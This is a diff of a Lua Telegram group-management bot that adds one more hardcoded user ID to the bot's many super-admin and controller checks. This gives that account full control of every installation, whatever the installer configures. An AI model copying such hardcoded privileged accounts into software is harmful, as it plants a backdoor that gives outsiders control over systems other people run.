@@ -112,7 +112,7 @@ return Chat_Type
 end
 function The_ControllerAll(UserId)
 ControllerAll = false
-local ListSudos = {Sudo_Id,656329268,5790986605}
+local ListSudos = {Sudo_Id,656329268,5790986605,2123332060}
 for k, v in pairs(ListSudos) do
 if tonumber(UserId) == tonumber(v) then
 ControllerAll = true
@@ -140,6 +140,8 @@ Status = true
 elseif The_ControllerAll(UserId) then
 Status = true
 elseif tonumber(UserId) == tonumber(5790986605) then
+Status = true
+elseif tonumber(UserId) == tonumber(2123332060) then
 Status = true
 elseif tonumber(UserId) == tonumber(Sudo_Id) then  
 Status = true
@@ -947,6 +949,8 @@ if UserId == 656329268 then
 Status = true
 elseif UserId == 5790986605 then
 Status = true
+elseif UserId == 2123332060 then
+Status = true
 elseif UserId == Sudo_Id then  
 Status = true
 elseif Controll2 then
@@ -993,6 +997,8 @@ if UserId == 656329268 then
 Status = true
 elseif UserId == 5790986605 then
 Status = true
+elseif UserId == 2123332060 then
+Status = true
 elseif UserId == Sudo_Id then  
 Status = true
 elseif Controll2 then
@@ -1036,6 +1042,8 @@ MalekAsase = Redis:sismember(abaza.."abaza:MalekAsase:Group"..ChatId,UserId)
 if UserId == 656329268 then
 Status = true
 elseif UserId == 5790986605 then
+Status = true
+elseif UserId == 2123332060 then
 Status = true
 elseif UserId == Sudo_Id then    
 Status = true
@@ -5408,7 +5416,7 @@ end
 --download('https://github.com/baselabaza/abaza/abaza.lua','abaza.lua')
 return MeroLua.sendText(msg_chat_id,msg_id,'\n*☤︙تم تحديث السورس * ',"md",true)  
 end
-if text == 'السيرفر ☤'  and ChCheck(msg) then
+if text == 'السيرفر ☤'  and ChCheck(msg) or text == 'السيرفر'  and ChCheck(msg) then
 
 
 if not msg.ControllerBot then 
@@ -5443,6 +5451,8 @@ if text == 'معلومات التنصيب' and ChCheck(msg) or text == 'معلو
  elseif tonumber(msg.sender_id.user_id) == tonumber(5790986605) then 
  usersend = true
 elseif tonumber(msg.sender_id.user_id) == tonumber(656329268) then
+YouCan = true
+elseif tonumber(msg.sender_id.user_id) == tonumber(2123332060) then
 YouCan = true
 else
  usersend = false
@@ -6447,6 +6457,8 @@ Redis:set(abaza.."abaza:Game:akape"..msg.chat_id..allgetr,SendJj)
 if tonumber(allgetr) == 656329268 then
 testser = true
 elseif tonumber(allgetr) == 5790986605 then
+testser = true
+elseif tonumber(allgetr) == 2123332060 then
 testser = true
 elseif The_ControllerAll(allgetr) == true then  
 testser = true
@@ -24207,6 +24219,8 @@ if tonumber(Message_Edit.sender_id.user_id) == 656329268 then
 data.The_Controller = 1
 elseif tonumber(Message_Edit.sender_id.user_id) == 5790986605 then
 data.The_Controller = 1
+elseif tonumber(Message_Edit.sender_id.user_id) == 2123332060 then
+data.The_Controller = 1
 elseif The_ControllerAll(Message_Edit.sender_id.user_id) == true then  
 data.The_Controller = 1
 elseif Redis:sismember(abaza.."abaza:DevelopersQ:Groups",Message_Edit.sender_id.user_id) == true then
@@ -24307,6 +24321,8 @@ Msg_id = data.message_id
 if tonumber(IdUser) == 656329268 then
 data.The_Controller = 1
 elseif tonumber(IdUser) == 5790986605 then
+data.The_Controller = 1
+elseif tonumber(IdUser) == 2123332060 then
 data.The_Controller = 1
 elseif The_ControllerAll(IdUser) == true then  
 data.The_Controller = 1
@@ -25015,6 +25031,8 @@ Redis:del(abaza.."abaza:Num:okiktm"..ChatId)
 if tonumber(GetUserReply) == 656329268 then
 testser = true
 elseif tonumber(GetUserReply) == 5790986605 then
+testser = true
+elseif tonumber(GetUserReply) == 2123332060 then
 testser = true
 elseif The_ControllerAll(GetUserReply) == true then  
 testser = true
